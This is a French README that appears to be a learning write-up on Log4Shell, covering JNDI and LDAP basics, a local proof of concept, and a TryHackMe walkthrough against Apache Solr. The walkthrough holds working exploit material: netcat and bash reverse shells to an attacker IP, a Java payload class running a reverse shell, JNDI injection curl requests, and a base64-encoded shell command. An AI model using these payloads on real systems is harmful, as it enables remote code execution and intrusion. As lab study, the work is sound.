
<h1>Introduction à Log4Shell</h1>

- [JNDI](#jndi)
- [LDAP](#ldap)
  - [OpenLDAP](#openldap)
  - [LDAP URL](#ldap-url)
- [log4j2](#log4j2)
- [suite, en LOCAL](#suite-en-local)
  - [OpenLDAP java schema](#openldap-java-schema)
  - [netcat](#netcat)
  - [Sans netcat](#sans-netcat)
  - [Exploit en local](#exploit-en-local)
- [attaque d'une machine vulnérable sur tryhackme](#attaque-dune-machine-vulnérable-sur-tryhackme)
  - [Echec !](#echec-)
  - [Succès avec marshalsec](#succès-avec-marshalsec)
    - [Préparation : marshalsec](#préparation--marshalsec)
    - [Préparation : le payload .class](#préparation--le-payload-class)
    - [Préparation : le listener ncat](#préparation--le-listener-ncat)
    - [Exécution : appel à solr](#exécution--appel-à-solr)
  - [Succès avec JNDIExploit](#succès-avec-jndiexploit)
    - [Préparation : JNDIExploit](#préparation--jndiexploit)
    - [Préparation : le listener ncat](#préparation--le-listener-ncat-1)
    - [Exécution : appel à solr](#exécution--appel-à-solr-1)

# JNDI

[https://www.jmdoudoux.fr/java/dej/chap-jndi.htm](https://www.jmdoudoux.fr/java/dej/chap-jndi.htm)

JNDI est l'acronyme de Java Naming and Directory Interface. Cette API fournit une interface unique pour utiliser différents services de nommages ou d'annuaires et définit une API standard pour permettre l'accès à ces services.

Il existe plusieurs types de services de nommage parmi lesquels :

    DNS (Domain Name System) : service de nommage utilisé sur internet pour permettre la correspondance entre un nom de domaine et une adresse IP
    LDAP(Lightweight Directory Access Protocol) : annuaire
    NIS (Network Information System) : service de nommage réseau développé par Sun Microsystems
    COS Naming (Common Object Services) : service de nommage utilisé par Corba pour stocker et obtenir des références sur des objets Corba
    etc, ...

Un service de nommage permet d'associer un nom unique à un objet et de faciliter ainsi l'obtention de cet objet.

Un annuaire est un service de nommage qui possède en plus une représentation hiérarchique des objets qu'il contient et un mécanisme de recherche.

JNDI propose donc une abstraction pour permettre l'accès à ces différents services de manière standard. Ceci est possible grâce à l'implémentation de pilotes qui mettent en oeuvre la partie SPI (Service Provider Interface) de l'API JNDI. Cette implémentation se charge d'assurer le dialogue entre l'API et le service utilisé.

JNDI possède un rôle particulier dans les architectures applicatives développées en Java car elle est utilisée dans les spécifications de plusieurs API majeures : JDBC, EJB, JMS, ...

![JNDI architecture](doc/jndiarch.jpg?raw=true)

JNDI est inclus dans le JDK, mais pas forcément toutes les implémentations de pilotes.

Le pilote LDAP est inclus.

![JNDI API](doc/jndi_api.drawio.png?raw=true)

# LDAP

LDAP, acronyme de Lightweight Directory Access Protocol, est un protocole de communication vers un annuaire en utilisant TCP/IP. Il est une simplification du protocole X 500 (d'où le L de Lightweight).

Le but principal est de retrouver des données insérées dans l'annuaire. Ce protocole est donc optimisé pour la lecture et la recherche d'informations.

LDAP est un protocole largement supporté par l'industrie informatique : il existe de nombreuses implémentations libres et commerciales : Microsoft Active Directory, OpenLDAP, Netscape Directory Server, Sun NIS, Novell NDS, ..

Ce protocole ne précise pas comment ces données sont stockées sur le serveur. Ainsi un serveur de type LDAP peut stocker n'importe quel type de données : ce sont souvent des ressources (personnes, matériels réseaux, ...).

La version actuelle de LDAP est la v3 définie par les RFC 2252 et RFR 2256 de l'IETF.

Dans un annuaire LDAP, les noeuds sont organisés sous une forme arborescente hiérarchique nommée le DIT (Direct Information Tree). Chaque noeud de cette arborescence représente une entrée dans l'annuaire. Chaque entrée contient un objet qui possède un ou plusieurs attributs dont les valeurs permettent d'obtenir des informations sur l'objet. Un objet appartient à une classe au sens LDAP.

La première entrée dans l'arborescence est nommée racine et est unique.

## OpenLDAP

```
sudo systemctl start slapd
```
puis
```
ldapsearch -x -W -D "cn=admin,dc=brochain" -b "dc=brochain" "(objectclass=*)"
```
retourne :
```
# extended LDIF
#
# LDAPv3
# base <dc=brochain> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# brochain
dn: dc=brochain
objectClass: top
objectClass: dcObject
objectClass: organization
o: brochain
dc: brochain

# users, brochain
dn: ou=users,dc=brochain
objectClass: organizationalUnit
ou: users

# adrien, users, brochain
dn: uid=adrien,ou=users,dc=brochain
objectClass: top
objectClass: account
objectClass: posixAccount
objectClass: shadowAccount
cn: adrien
uid: adrien
uidNumber: 16859
gidNumber: 100
homeDirectory: /home/adrien
loginShell: /bin/bash
gecos: adrien
userPassword:: e2NyeXB0fXg=
shadowLastChange: 0
shadowMax: 0
shadowWarning: 0

# search result
search: 2
result: 0 Success

# numResponses: 4
# numEntries: 3
```
Chaque objet possède un Relative Distinguish Name (RDN) qui correspond à une paire clé/valeur d'un attribut obligatoire. Un objet est identifié de façon unique grâce à sa référence unique dans le DIT : son Distinguish Name (DN) qui est composé de l'ensemble des RDN de chaque objet père dans l'arborescence lue de droite à gauche et son RDN (ceci correspond donc au DN de l'entrée père et de son RDN). Cette référence représente donc le chemin d'accès depuis la racine de l'arborescence. Le DN se lit de droite à gauche puisque la racine est à droite.

La convention de nommage utilisée pour le DN, utilise la virgule comme séparateur et se lit de droite à gauche.
```
dn: uid=adrien,ou=users,dc=brochain
```

<table class="tableau" width="80%" border="1" align="center" cellpadding="4" cellspacing="0"> 
    <tr> 
      <td>Mnn&eacute;monique</td> 
      <td>Libell&eacute;</td> 
      <td>Description</td> 
    </tr> 
    <tr> 
      <td>dn</td> 
      <td>Distinguished name</td> 
      <td>Nom unique dans l'arborescence</td> 
    </tr> 
    <tr> 
      <td>uid</td> 
      <td>Userid</td> 
      <td>Identifiant unique pour l'utilisateur</td> 
    </tr> 
    <tr> 
      <td>cn</td> 
      <td>Common name</td> 
      <td>Nom et pr&eacute;nom d'un utilisateur</td> 
    </tr> 
    <tr> 
      <td>givenname</td> 
      <td>First name</td> 
      <td>Pr&eacute;nom d'un utilisateur</td> 
    </tr> 
    <tr> 
      <td>sn</td> 
      <td>Surname</td> 
      <td>Nom de l'utilisateur</td> 
    </tr> 
    <tr> 
      <td>l</td> 
      <td>Location</td> 
      <td>Ville de l'utilisateur</td> 
    </tr> 
    <tr> 
      <td>o</td> 
      <td>Organization</td> 
      <td>G&eacute;n&eacute;ralement la racine de l'annuaire (exemple&nbsp;: le nom de l'entreprise)</td> 
    </tr> 
    <tr> 
      <td>ou</td> 
      <td>Organizational unit</td> 
      <td>G&eacute;n&eacute;ralement une branche de l'arbre (exemple&nbsp;: une division, un d&eacute;partement ou un service)</td> 
    </tr> 
    <tr> 
      <td>st</td> 
      <td>State</td> 
      <td>Etat du pays de l'utilisateur</td> 
    </tr> 
    <tr> 
      <td>c</td> 
      <td>Country</td> 
      <td>pays de l'utilisateur</td> 
    </tr> 
    <tr> 
      <td>Mail</td> 
      <td>Email</td> 
      <td>Email de l'utilisateur</td> 
    </tr> 
  </table>

## LDAP URL

[https://docs.oracle.com/javase/jndi/tutorial/ldap/misc/url.html](https://docs.oracle.com/javase/jndi/tutorial/ldap/misc/url.html)

# log4j2

[https://stackoverflow.com/questions/70375782/sense-behind-the-ldap-lookup-feature-in-log4j](https://stackoverflow.com/questions/70375782/sense-behind-the-ldap-lookup-feature-in-log4j)

Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

log :
```
09:42:23.720 [main] INFO  intro.TestLog4j2 - com.sun.jndi.ldap.LdapCtx@10d307f1
```
POC OK : on peut appeler un LDAP avec un log

![Test local](doc/TestLocal.drawio.png?raw=true)

Test du correctif

[https://logging.apache.org/log4j/2.x/security.html](https://logging.apache.org/log4j/2.x/security.html)
pom.xml
```
<log4j2.version>2.17.1</log4j2.version>
```
log :
```
09:35:23.651 [main] INFO  intro.TestLog4j2 - ${jndi:ldap://localhost:389/uid=adrien,ou=users,dc=brochain}
```

# suite, en LOCAL

Jusque-là on a appelé un OpenLDAP local, avec un main Java.
Java > log4j2 > JNDI > LDAP local

Exécuter du code ?

Au début du fichier, si l'on utilise OpenLDAP avec JNDI pour stocker des objets Java, il faut ajouter le schéma Java.
slapd.conf

## OpenLDAP java schema
```
ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/ldap/schema/java.ldif
```

## netcat

[https://nc110.sourceforge.io/](https://nc110.sourceforge.io/)

![OSI TCP IP](doc/osi-tcpip.png?raw=true)

Objectif de l'exploit : ouvrir sur notre machine le port TCP 9999

![netcat](doc/netcat.drawio.png?raw=true)

```
nc -lp 9999
```
Etablir une connexion depuis la machine vulnérable, vers notre machine
```
nc <<attacker IP>> 9999 -e /bin/bash
```
"In the simplest usage, "nc host port" creates a TCP connection to the given
port on the given target host.  Your standard input is then sent to the host,
and anything that comes back across the connection is sent to your standard
output.  This continues indefinitely, until the network side of the connection
shuts down"

"-e filename             program to exec after connect [dangerous!!]"

"this option can redirect the input, output, and error messages of an executable to a TCP/UDP port 
rather than the default console."

[https://michalwojcik.com.pl/2020/10/08/netcat-2-bind-reverse-shell/](https://michalwojcik.com.pl/2020/10/08/netcat-2-bind-reverse-shell/)

"Once the connection is established, target’s Netcat will redirect /bin/bash output/input/error streams 
to attacker’s connected machine on port 9999. Thus, attacker will be able to execute commands on target’s computer."

## Sans netcat

Souvent, la version de netcat est installée sans l'option -e

On peut alors ouvrir un reverse shell en bash.
```
bash -i >& /dev/tcp/<<attacker ip>>/9999 0>&1
```
(sur kali le shell est zsh...)

## Exploit en local

![Test local 2](doc/TestLocal2.drawio.png?raw=true)

Si besoin `ldapdelete  -x -W -D "cn=admin,dc=brochain" 'cn=malicious-exploit,dc=brochain'` puis `exploit.v2.JNDIBind`

1. exploit.v1.JNDIBind
2. exploit.v1.JNDILookup
3. exploit.v2.Exploit
4. exploit.v2.JNDIBind
5. exploit.v2.JNDILookup
6. `nc -lnp 9999` puis exploit.v2.Log4j2Lookup

# attaque d'une machine vulnérable sur tryhackme

Lancer la machine et naviguer dans l'IHM Apache Solr

## Echec !

en local
```
nc -lnvp 9999
```

en local, pour connaître mon IP sur le réseau de tryhackme
```
ifconfig
```
ou
```
ip addr show
```

on requête l'application Apache Solr vulnerable sur la machine cible
```
curl 'http://10.10.106.228:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.236:389/cn=malicious-exploit,dc=brochain\}'
```

Problème (en fait) dans les logs de l'application cible :
```
INFO  (qtp1008315045-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.9.2.236:389/cn%3Dmalicious-exploit,dc%3Dbrochain}} status=0 QTime=0
```
On arrive pas à produire le log qu'on veut côté Solr. Les = sont url décodés

## Succès avec marshalsec

[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)

Plan (*attention les IP ne correspondent pas aux commandes ci-dessous*) :

![avec marshalsec v1](doc/thm_solar.drawio.svg?raw=true)

### Préparation : marshalsec

Si besoin, recompiler le jar marshalsec
```
mvn clean package
```

Puis
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.2.236:8000/#Exploit"
```
(`10.9.2.236` est mon IP)
"With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server"

### Préparation : le payload .class

Dans un répertoire www, on compile la classe Exploit.java
```
import java.io.Serializable;

public class Exploit implements Serializable {

    private static long serialVersionUID = 1L;

    static {
        try {
            Runtime.getRuntime().exec("nc 10.9.2.236 9999 -e /bin/bash");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

*Note* ici on pourrait tester avec l'autre reverse shell `bash -i >& /dev/tcp/10.9.2.236/9999 0>&1`

Avec :
```
javac Exploit.java -source 8 -target 8
```
Puis on expose le répertoire (pour le .class) avec :
```
python3 -m http.server
```

### Préparation : le listener ncat

```
nc -lnvp 9999
```

### Exécution : appel à solr

```
curl 'http://10.10.106.228:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.236:1389/Exploit\}'
```
(`10.10.106.228` est l'IP de la machine cible)

## Succès avec JNDIExploit

[https://github.com/avergnaud/JNDIExploit](https://github.com/avergnaud/JNDIExploit)

Plan (*attention les IP ne correspondent pas aux commandes ci-dessous*) :

![avec JNDIExploit](doc/thm_solar_v2.drawio.svg?raw=true)

### Préparation : JNDIExploit

Si besoin, recompiler le jar
```
mvn clean package
```

Exécuter
```
java -jar target/JNDIExploit-1.0-SNAPSHOT.jar -i 10.9.2.236 -p 8888
```
(`10.9.2.236` est mon IP)

### Préparation : le listener ncat

Lancer :
```
nc -lnvp 9999
```

### Exécution : appel à solr

Sur [https://www.base64encode.org/](https://www.base64encode.org/) encoder `nc 10.9.2.236 9999 -e /bin/bash`

Résultat :
```
bmMgMTAuOS4yLjIzNiA5OTk5IC1lIC9iaW4vYmFzaA==
```
Puis :
```
curl 'http://10.10.106.228:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.236:1389/Basic/Command/Base64/bmMgMTAuOS4yLjIzNiA5OTk5IC1lIC9iaW4vYmFzaA==\}'
```
(`10.10.106.228` est l'IP de la machine cible)

*note* : pour info, JNDIExploit retourne bien des payloads de classes Java sérialisées, quand on le requête avec une LDAP URL.
```
[+] Send LDAP reference result for Basic/Command/Base64/bmMgMTAuOS4yLjIzNiA5OTk5IC1lIC9iaW4vYmFzaA== redirecting to http://10.9.2.236:8888/ExploitXlJafSwxR8.class
[+] New HTTP Request From /10.10.106.228:43946  /ExploitXlJafSwxR8.class
[+] Receive ClassRequest: ExploitXlJafSwxR8.class
```